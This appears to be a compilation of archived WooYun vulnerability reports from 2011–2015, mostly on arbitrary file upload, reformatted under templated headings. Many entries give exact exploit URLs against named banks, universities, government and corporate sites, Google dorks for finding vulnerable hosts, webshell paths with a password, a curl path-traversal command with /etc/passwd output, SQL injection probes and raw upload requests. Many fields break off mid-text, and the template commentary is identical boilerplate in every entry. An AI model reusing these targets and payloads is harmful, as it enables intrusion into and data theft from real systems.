**详情**: 深圳市商科网络科技有限公司【http://www.intersk.com/】，是一家致力于品牌网站建设，优化推广，400电话，企业邮箱、网站应用程序开发（B/S）等互联网领先服务商。简单的来说该公司开发的一套系统虽然没有什么名字这里就以“深圳互联系统”来命名，该系统主要用于深圳市各大企业公司网站的建设，该系统存在注射漏洞和未授权的任意文件上次漏洞，可能造成极大的危害，如何识别为深圳互联系统，我们看看后台的风格：输入admin可到下面后台：官网成功案例：该系统的url特征比较普遍，所以构造关键字比较难："网站制作：商科网络"inurl:“products.asp?classid” intitle:深圳第二个关键字搜索的大多是深圳互联系统，部分非互联系统，更好认证为该系统的方法只要在域名后加上：/admin。则会跳转到后台，如果后台页面风格与上面所提到的一样则可断定为深圳互联系统

**POC**: 【警告：以下所提到的漏洞杀伤力极强，仅供CNVD测试与漏洞报告，其它人不得用此漏洞进行恶意破坏或利用，否则后果自负！】一、SQL注射漏洞：注射漏洞1：/productlist.asp?ID=  注入参数ID <部分没有该页面>注射漏洞2：/admin/Employee/Login.asp <登录框Post注射，通杀注射>*********************************************************************************************SQL注射一、证明【该系统部分装有安全狗】：测试跑跑吧：******************

**绕过**: 直接利用

**修复**: 不多说了，注射漏洞有一些装了安全狗，建议CNVD测试的时候官网有案例，以上均不深入咯！其次说一下通报漏洞的联系方式：官网：http://www.intersk.com/技术支持邮箱：support@intersk.com  投诉建议邮箱：feedback@intersk.com热线：+86-755-
---

---
### [wooyun-2011-03635] 江苏省通信管理局增值电信业务办理平台漏洞
**厂商**: 江苏省通信管理局 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注册企业账号后，进入系统进行上次资料等，可利用";"等符号进行上传任意文件，类似jsp。因系统对web目录权限的宽松，可直接秒掉服务器。

**POC**: 代码我就不贴了，贴图吧。仅为信息安全测试，并无任何破坏。

**绕过**: 直接利用

**修复**: 对用户提交信息进行严格控制，对web目录程序等进行严格权限控制，不要开太多共享目录。这样更容易被跨权限。
---

---
### [wooyun-2015-0161721] 李锦记健康产品集团某站存在任意文件上传
**厂商**: 李锦记健康产品集团 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 李锦记健康产品集团某站存在任意文件上传。地址：http://booking.lkkhpg.com//defaultroot/login.jsp上传地址：http://booking.lkkhpg.com///defaultroot/extension/smartUpload.jsp?path=information&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0

**POC**: shell：http://booking.lkkhpg.com/defaultroothttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/information/2015121519185721255543434.jsp

**绕过**: 直接利用

**修复**: 多给点rank吧，
---

---
### [wooyun-2011-02947] youku任意文件上传
**厂商**: 优酷 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: project.youku.com/diy/upload.php

**POC**: (见原文)

**绕过**: 直接利用

**修复**: hey! man!you know that.
---

---
### [wooyun-2015-0103185] KXmail任意文件上传导致代码执行
**厂商**: 科信软件 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上传页面:http://mail.scihc.net/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/php/upload.php案例如下:http://mail.cdzk.org:8888/editor/filemanager/connectors/php/upload.phphttp://mail.scihc.net/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/php/upload.phphttp://mail.ziyang.gov.cn/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/php/up

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 对文件扩展名重命名操作
---

---
### [wooyun-2013-035229] 改图网某个分域名存在任意文件上传漏洞可导致主站沦陷
**厂商**: 改图网 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 改图网后台管理处使用了FCKeditor编辑器，但是FCKeditor编辑器未能正确配置，导致任意文件上传。上穿文件地址：http://mana.gaitu.com/FCKeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/test.html上穿aspx 马后，发现没有限制目录，在D:\SITE\Core\ 发现了网站的程序备份。分析了WWW下主站的程序，发现目录下有个 connn.aspx 程序可疑。因为.net程序 配置文件在web.config ，进一步发现 connn.aspx 是一个 aspxspy后门。进入主站一试，后门存在：http://www.gaitu.com/connn.aspx解出MD5密码，成功进入主站看了主站 www下的web.config 发现，原来数据库在

**POC**: http://www.gaitu.com/connn.aspx本人声明：未破坏任何数据！

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2014-075840] 金龙卡金融化一卡通校园卡查询系统任意文件上传导致任意代码执行
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 厂商：	 哈尔滨新中新电子股份有限公司谷歌搜索：http://music.google.cn/search?q=inurl:managerOneGgxxfb.action&newwindow=1&site=webhp&ei=u5ERVI_ULJfm8AX8v4CQDQ&start=40&sa=N （关键字可能不大准确..）实例：http://ecard.sjtu.edu.cn/homeLogin.action  上海交通大学http://ecard.sdu.edu.cn/homeLogin.action 山东大学http://ecard.utsz.edu.cn/homeLogin.action 深圳大学http://card.tjfsu.edu.cn/homeLogin.action 天津外国语大学http://ecard.tust.edu.cn/homeLogin.action 天津科技

**POC**: http://kwzx.hbue.edu.cn/homeLogin.action 湖北经济学院为例：http://kwzx.hbue.edu.cn/pages/xxfb/editor/uploadAction.action  文件上传处没有上传文件的按钮，可自己审查元素添加： <input type="submit" value="upload">http://kwzx.hbue.edu.cn/noticespic/moo20143711203700.jsp 密码：wooyunhttp://card.dgpt.edu.cn/pages/xxfb/editor/uploadAction.acti

**绕过**: 直接利用

**修复**: 以上测试上传几例就麻烦cncert国家互联网应急中心确认后删除一下。
---

---
### [wooyun-2014-062997] 某通用程序任意目录遍历及文件上传导致任意代码执行（影响全国各省）
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 参数注入, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 之前在 CNVD 提交另一处漏洞，今儿借助该平台提交另一处问题吧。影响范围：全国各省市地区烟草专卖局及少数GOV站点--------------------------------------------------------百度、谷歌 dork:  inurl:/ycportal--------------------------------------------------------问题一：任意目录遍历漏洞测试链接：http://目标站点/ycportal/js/wbTextBox/showimg.jsp?jumpPage=1&url=/说明：参数jumpPage为页数，如果一页不能显示全部文件，可修改该参数值，url为路径。问题二：文件上传导致任意代码执行漏洞测试链接：http://目标站点/ycportal/js/wbTextBox/uploadfile.jsp?blocki

**POC**: 问题一：任意目录遍历漏洞http://www.yqycgs.com.cn/ycportal/js/wbTextBox/showimg.jsp?jumpPage=1&url=/http://www.dtycgs.cn:9080/ycportal/js/wbTextBox/showimg.jsp?jumpPage=1&url=/http://www.sxlfyc.com/ycportal/js/wbTextBox/showimg.jsp?jumpPage=1&url=/其他的就不截图了……http://ycycgs.com.cn/ycportal/js/wbTextBox/showimg.jsp?

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0113981] 厦门理工某个存在fck上传漏洞 3个网站
**厂商**: 厦门理工 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 厦门理工3个网站http://210.34.213.107/default2.aspxhttp://210.34.213.105/default2.aspxhttp://210.34.213.88/default2.aspx都是的http://210.34.213.107//fckeditor/editor/filemanager/browser/default/browser.html?&connector=../../connectors/aspx/connector.aspxhttp://210.34.213.88//fckeditor/editor/filemanager/browser/default/browser.html?&connector=../../connectors/aspx/connector.aspxhttp://210.34.213.105//fckedit

**POC**: ``````````````````````

**绕过**: 直接利用

**修复**: bqc
---

---
### [wooyun-2012-07071] 用友ICC网站客服系统远程代码执行漏洞
**厂商**: 用友软件 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 全部采用用友ICC客服系统,上线前没有做严格测试!导致漏洞产生!全部可以获得管理权限!网络游戏盛大网络光通娱乐在线销售麦考林母婴之家教育威迅教育中锐留学汽车广州本田永达汽车物流顺丰速运申通快递保险太平洋保险PICC中国人保软件/互联网金山软件政府上海公共研发平台金融中国银联环迅电子商务有限公司IFX大成基金东亚银行运营商中国电信中国联通安徽电信西藏电信行业资讯平台泡泡网中国汽车网中国塑料网网易163零售卖场苏宁电器漏洞出现在：5107\upload\uploadfilesave.php 内<?php/*** uploadfilesave.php* 访客端文件上传.*/require_once('../global.inc.php');/*chdir($CONFIG["canned_file_tmp"]);exec("rm -rf *");*/$date = date("Ymd");$des

**POC**: 前几天乌云有人提交迅雷http://icc.xunlei.com/5107/chat/chat.php 就这个问题导致。。。传张图吧

**绕过**: 直接利用

**修复**: 修复下。
---

---
### [wooyun-2014-086882] 53KF任意文件下载漏洞（多个企业中标）
**厂商**: 53KF企业在线平台 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入, 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 文件上传成功后返回的下载地址：file参数指定一个不存在文件时会报绝对路径使用..%2F可以绕过../限制curl 'http://test2.53kf.com/new/client.php?m=download&a=downloadFile&file=..%2F/../../../../../../../../../../etc/passwd'root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:sh

**POC**: 53KF官方：http://test2.53kf.com/new/client.php?m=download&a=downloadFile&file=..%2Fclient.php其它很多（inurl:new/client.php?arg=）：http://53kf2.meizu.com/new/client.php?m=download&a=downloadFile&file=..%2Fclient.php（我大魅族再次中枪了 唉！）http://csuser.jia.com/new/client.php?m=download&a=downloadFile&file=..%2Fclient.

**绕过**: 过滤绕过

**修复**: 你们懂得
---

---
### [wooyun-2015-099975] 亚风速递某分站上传漏洞
**厂商**: 广东省信息安全测评中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 亚风速递某分站上传漏洞导致主站沦陷，主站成马场，各种黑帽的推广

**POC**: http://oa.airfex.net/upfile.asp很简单的上传漏洞主站成了马厂还有黑帽的SEO主站有各种SQL注入漏洞http://www.airfex.net/cn_asp/news_show.asp?id=1092 and 1=1 正常页http://www.airfex.net/cn_asp/news_show.asp?id=1092 and 1=2 错误页主站还有 IIS写入WebDAV 漏洞主站后台地址：http://www.airfex.net/ruanji_2008/login.asp

**绕过**: 直接利用

**修复**: 你们公司还是赶快找个安全工程师吧~~~求礼物
---

---
### [wooyun-2012-08734] 华安基金网上交易平台存在用友任意上传漏洞 可提权
**厂商**: 华安基金 | **年份**: 2012 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 上传功能

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 华安基金网上交易平台存在用友任意上传漏洞 可提权安装用友软件的服务器 权限为什么一般都是放开的也不设置文件夹安全访问限制 晕死

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 把漏洞补一下 进行服务器权限设置
---

---
### [wooyun-2014-060239] 安徽林业局任意文件上传漏洞
**厂商**: 安徽林业局 | **年份**: 2014 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: http://www.ahaqly.gov.cn/main/model/newsoperation/webEditor/eWebEditor.jsp直接进入eWebEditor

**绕过**: 直接利用

**修复**: 你比我懂
---

---
### [wooyun-2012-04685] 用友ICC网站客服系统远程代码执行漏洞
**厂商**: 用友软件 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 以下网站客服系统全部采用用友ICC客服系统网络游戏盛大网络光通娱乐在线销售麦考林母婴之家教育威迅教育中锐留学汽车广州本田永达汽车物流顺丰速运申通快递保险太平洋保险PICC中国人保软件/互联网金山软件政府上海公共研发平台金融中国银联环迅电子商务有限公司IFX大成基金东亚银行运营商中国电信中国联通安徽电信西藏电信行业资讯平台泡泡网中国汽车网中国塑料网网易163零售卖场苏宁电器小米科技该程序的/home/ecccs/web/5107https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/uploadFlash.php文件存在严重的逻辑错误!导致漏洞产生!以上大型网站的客服系统全部可以通过此漏洞获取管理权限!<?php/*** uploadFlash.php* Flash文件上传.*/require_once('../global.inc.php

**POC**: 随便例举几个存在的https://95516.unionpay.com/5107https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/uploadFlash.php   银联http://icc.xunlei.com/5107https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/uploadFlash.php        迅雷http://app6.cpic.com.cn/5107https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload

**绕过**: 直接利用

**修复**: 速度联系用友升级吧.这套系统里不是只有这么一个问题.我记得还有一个.临时找不到了.你们自己挖吧.
---

---
### [wooyun-2012-09342] bbsxp上传过滤不严 可上传asp;jpg 文件
**厂商**: bbsxp | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 此漏洞在http://byz2010.caa.edu.cn/bbs/ 发现  登录账号后 发表新主题 添加附件 可以添加 asp;jpg格式文件

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 管理在后台禁用附件上传 或者 在禁用上传类型中 添加类似 asp;jpg php;jpg 等格式
---

---
### [wooyun-2014-071151] 某通用型校园校务系统任意文件上传之一
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 关键词：inurl:/sm2005上传漏洞，威胁挺大的。

**POC**: 相关案例：http://www.dlwsxx.com//SM2005/public/AspUpload/index.htmlhttp://www.hwsyxx.com/SM2005/public/AspUpload/index.htmlhttp://www.suyaxing.com:81/SM2005/public/AspUpload/index.htmlhttp://www.lcxyz.com:21245/SM2005/public/AspUpload/index.htmlhttp://www.zjnksyzx.com:8801/SM2005/public/AspUpload/index.h

**绕过**: 直接利用

**修复**: 过滤上传脚本。
---

---
### [wooyun-2013-034715] 万和证券某站点任意代码执行
**厂商**: 万和证券 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 万和证券旗下产品“财易通”手机证券下载站点存在struts漏洞，可被脱裤

**POC**: 漏洞地址：http://wap.vanho.cn/index.action良好公民，安全检测，绝不脱裤，尽快修复

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-019640] 建设银行某分站存在高危安全漏洞
**厂商**: 建设银行 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题很多。。 跨站什么的就不发了http://ris.ccb.com/journalx/secure/admin/fckeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/jsp/connectorhttp://ris.ccb.com/CN/item/downloadFile.jsp?filedisplay=../../CN/item/downloadFile.jsp

**POC**: http://ris.ccb.com/journalx/secure/admin/fckeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/jsp/connectorhttp://ris.ccb.com/CN/item/downloadFile.jsp?filedisplay=../../CN/item/downloadFile.jsp

**绕过**: 直接利用

**修复**: 都懂。。
---

---
### [wooyun-2013-034698] 某市行政处罚电子政务和电子监察系统struts漏洞导致其服务器沦陷
**厂商**: cncert | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 焦作市行政处罚电子政务和电子监察系统struts漏洞导致其服务器沦陷

**POC**: 网站地址：http://218.28.55.152/login.jsp考虑到此系统数据可能比较敏感，我直接没去碰数据库那块，添加个管理员直接远程桌面由于此系统的特殊性，本菜鸟只测试到这，不再继续深入。数据库碰都没敢碰，厂商尽快修复就是了。

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-054805] 某p2p网贷系统任意上传漏洞涉及金钱交易
**厂商**: 某p2p网贷系统 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某p2p网贷系统 任意上传漏洞 涉及金钱交易数千万。。

**POC**: google搜索 inurl:queryFrontAllDebt.do还有其他用户在使用该系统。http://www.yimincaifu.comhttp://116.255.138.208http://www.rjd.cchttp://www.crfp2p.comhttp://www.07363135555.comhttp://www.zrct.nethttp://www.letourong.com上传地址:http://www.winwindai.com/admin/uploadFileAction.do?obj=%7B%27fileType%27%3A%27JPG%2CJSP%2CGIF

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2014-064682] cmail 文件包含漏洞加上传漏洞
**厂商**: 施耐德电气 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 先是上传，编辑器惹的祸，你懂的，然后是文件包含

**POC**: 上传啊：POST /editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/php/upload.php HTTP/1.1Host: mail.schneider-electric.cnUser-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-L

**绕过**: 直接利用

**修复**: 老板本，估计也不会更新，
---

---
### [wooyun-2013-031946] 中国移动400 某同类型后台在次沦陷
**厂商**: 北京天润融通 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://baidusz.ti-net.cn/fckeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/php/upload.php?Type=Media本地构造提交搞定！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 我相信一个有垄断趋势的通讯上市公司，绝对有能力修复此漏洞，“弹指一挥间”的事情！
---

---
### [wooyun-2014-073220] 厦门某人才服务中心FCK编辑器上传漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: fck路径http://www.xmwsrc.com/admin/fckeditorsampleshttp://www.xmwsrc.com/admin/fckeditor/_samples/default.html来，利用samples看看是不是能发现什么有趣的文件果然不出所料http://www.xmwsrc.com/UploadFiles/file/1.asp/asp.jpg无法连接，有点意思，换成1.cer试试？一句话地址：http://www.xmwsrc.com/UploadFiles/file/1.cer/hlnjwl.jpg

**POC**: 上刀权限大已经有很多人光顾了-养马场

**绕过**: 直接利用

**修复**: 删除samples，fck加权限，iis针对上传目录禁止脚本执行等等等等
---

---
### [wooyun-2013-040090] 乐视网某分站文件上传及信息泄露漏洞
**厂商**: 乐视网 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题分站上传漏洞链接：1、http://msla.hz.letv.com/upload.jsp?action=upfile2、通过上传1个正常的jpg，分析获取到实际的图片上传路径3、查看网站某图片的URL地址拼接图片上传路径，将图片中的部分数值进行替换即可。4、将上传页面另存为本地，使用UE对上传的后缀名进行修改，将pnp改成需要上传的jsp5、上传jsp文件后，使用菜刀连接6、数据库ip地址、用户名密码信息泄露

**POC**: 已经证明。

**绕过**: 直接利用

**修复**: 服务器端验证文件后缀名，第一次关注乐视网，有木有礼物送上呢。
---

---
### [wooyun-2015-0130668] 珠海基层信息上报服务平台任意文件上传
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 匿名上传点, 上传后查看源码获得访问路径

**POC**: System 的 IIS..外连 SQLSERVER , 虽然这个库没多少东西. 其他的就不知道了. (另外吐槽一下明文的密码

**绕过**: 直接利用

**修复**: 过滤上传点. 加权限验证,上传后缀白名单.降权 IIS关闭 SQLSERVER 的外连 使用仅本地连接防止爆破
---

---
### [wooyun-2015-0103604] 全峰快递某分站上传漏洞
**厂商**: 全峰快递 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 全峰快递某分站上传漏洞

**POC**: http://122.225.104.50:8080/templates/index/hrlogon.jsp扫描目录发现有FCKeditorhttp://122.225.104.50:8080/fckeditor//editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=/目录可以任意遍历http://122.225.104.50:8080/fckeditor//editor/filemanager/browser/default/con

**绕过**: 直接利用

**修复**: 你们懂得~~
---

---
### [wooyun-2014-083958] 湖南广播电视台基础上传漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 网络未授权访问

**元思考**: 触发信号: 功能测试

**洞察**: 网络未授权访问防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络未授权访问相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 23万的东西这么垃圾 不解释http://203.195.196.198:81/kindeditor/asp/demo.asphttp://203.195.196.198:81/kindeditor/asp.net/demo.aspxhttp://203.195.196.198:81/kindeditor/examples/custom-plugin.htmlhttp://203.195.196.198:81/kindeditor/examples/custom-theme.htmlhttp://203.195.196.198:81/kindeditor/examples/default.htmlhttp://203.195.196.198:81/kindeditor/examples/dynamic-load.htmlhttp://203.195.196.198:81/kindedito

**POC**: 23万的东西这么垃圾 不解释http://203.195.196.198:81/kindeditor/asp/demo.asphttp://203.195.196.198:81/kindeditor/asp.net/demo.aspxhttp://203.195.196.198:81/kindeditor/examples/custom-plugin.htmlhttp://203.195.196.198:81/kindeditor/examples/custom-theme.htmlhttp://203.195.196.198:81/kindeditor/examples/default.ht

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2014-082366] 淘宝某接口通过文件上传可盗取用户cookies信息
**厂商**: 淘宝网 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 该漏洞存在手机旺信发送图片的上传接口中，由于没有限制上传文件类型，虽然JSP等脚本文件不能执行，但可以上传HTML文件，可执行JS代码，进而可以盗取用户cookies等敏感信息！上传接口：POST /ul HTTP/1.1Connection: Keep-AliveContent-Type: multipart/form-data; boundary=2344fcfd9fe0468182661bae96c90690Accept-Charset: utf-8Content-Range: bytes 0-20459/21262User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.0.2; sdk Build/ICS_MR0)Host: slice.wangxin.taobao.comAccept-Encoding: gzipContent-Length: 

**POC**: 写了个上传测试程序http://yunpan.cn/csIwcLgPSLWPm （提取码：f15a）下面两个是我自己上传后的链接：http://interface.im.taobao.com/mobileimweb/fileupload/downloadPriFile.do?type=2&fileId=86a821fd237f976a17a55fb463cb183d.html&suffix=html&width=78&height=26&mediaSize=220http://interface.im.taobao.com/mobileimweb/fileupload/downloadPriF

**绕过**: 直接利用

**修复**: 限制上传文件类型对用户上传的文件进行检测
---

---
### [wooyun-2015-0109165] 奥迪官网系统存在任意文件上传可导致大量用户数据泄露
**厂商**: 一汽大众汽车有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、官网地址2、google搜索3、客户端做了过滤，但是只要截获数据包，改变后缀一样可以上传4、上传jsp脚本5、获取路径6、连接成功

**POC**: 7、数据库连接数据8、用户数据19、用户数据210、用户数据311、用户数据412、用户数据513、注册用户数据6

**绕过**: 直接利用

**修复**: 只是帮忙检测，绝不散播数据。修复建议：上传组件不要暴露在互联网,或者更强壮的验证机制求礼物奥迪R8的模型
---

---
### [wooyun-2014-077838] 万达某站注入及某处任意文件上传
**厂商**: 大连万达集团股份有限公司 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 0x1http://www.wdghy.com/wdghyhd/register2.jsp?type=1供方注册处,文件后缀在请求链接中,添加jsp后缀就可以上传.http://www.wdghy.com/wdghyhd/uploadfile.jsp?method=goFileUpload&fileType=jpg&maxSize=5&eleid=businesslicense&abc=0.18216927155681018需要猜路径....0x2注入.http://www.vans-china.cn登陆注入.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-088903] 某通用型大学生管理系统非授权访问
**厂商**: 南京先极科技有限公司 | **年份**: 2014 | **类型**: 非授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 非授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别非授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

